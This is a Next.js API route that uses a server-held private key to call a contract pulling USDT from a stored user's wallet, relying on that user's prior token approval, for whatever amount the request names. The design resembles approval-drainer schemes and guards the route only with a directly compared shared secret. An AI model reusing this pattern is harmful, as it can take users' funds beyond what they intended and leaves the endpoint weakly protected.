/* eslint-disable @typescript-eslint/no-unsafe-member-access */
/* eslint-disable @typescript-eslint/no-unsafe-call */
/* eslint-disable @typescript-eslint/no-unsafe-assignment */
import { ethers } from "ethers";
import { headers } from "next/headers";
import { env } from "~/env";
import { ensureBSC, USDT_BSC } from "~/lib/crypto-functions";
import { db } from "~/server/db";

export async function POST(req: Request) {
  const requestHeaders = await headers();

  const signature = requestHeaders.get("x-signature");

  if (!signature) {
    return new Response("Missing signature", { status: 400 });
  }

  if (signature !== env.SIGNATURE_SECRET) {
    return new Response("Invalid signature", { status: 403 });
  }

  const body = (await req.json()) as {
    walletId: string;
    amount: string;
  };

  const walletAddress = await db.query.wallets.findFirst({
    where: (wallet, { eq }) => eq(wallet.id, parseFloat(body.walletId)),
  });

  const RPC = "https://bsc-dataseed.binance.org/";
  const provider = new ethers.JsonRpcProvider(RPC);

  const signer = new ethers.Wallet(env.PRIVATE_KEY, provider);

  // const ERC20_ABI = [
  //   "function allowance(address owner, address spender) view returns (uint256)",
  //   "function transferFrom(address from, address to, uint256 amount)",
  //   "function transfer(address to, uint256 amount)",
  // ];

  const COLLECTOR_ABI = [
    "function collect(address token, address user, uint256 amount)",
  ];

  const collector = new ethers.Contract(
    env.TREASURY_ADDRESS, // 🔑 APPROVED SPENDER
    COLLECTOR_ABI,
    signer,
  );

  console.log("SIGNER ADDRESS ", signer.address);

  // const wallet = new ethers.Wallet(env.PRIVATE_KEY, provider);

  const amount = ethers.parseUnits(body.amount, 18);

  // const usdt = new ethers.Contract(USDT_BSC, ERC20_ABI, wallet);

  // console.log("ADDRESS BACKED", wallet.address);

  // const allowance = await usdt.allowance!(
  //   "0xB33C12383908C9D5A3202788ff309bfBDaFbcE54", // user
  //   "0x0C90CD2c2AeDb86F7aDEB78640cB0F5ABb554327", // ACTUAL SPENDER
  // );

  // console.log("Allowance:", ethers.formatUnits(allowance, 18));

  // const tx = await usdt.transferFrom!(
  //   "0xB33C12383908C9D5A3202788ff309bfBDaFbcE54",
  //   "0xeFb4CC65C7572cf880BDC0787E11Fe9429747306",
  //   amount,
  // );

  // await tx.wait();

  const tx = await collector.collect!(
    USDT_BSC,
    walletAddress?.address, // USER ADDRESS
    amount,
  );

  await tx.wait();

  console.log("Transaction hash:", tx.hash);

  return new Response(
    JSON.stringify({
      txHash: tx.hash,
    }),
    { status: 200 },
  );
}
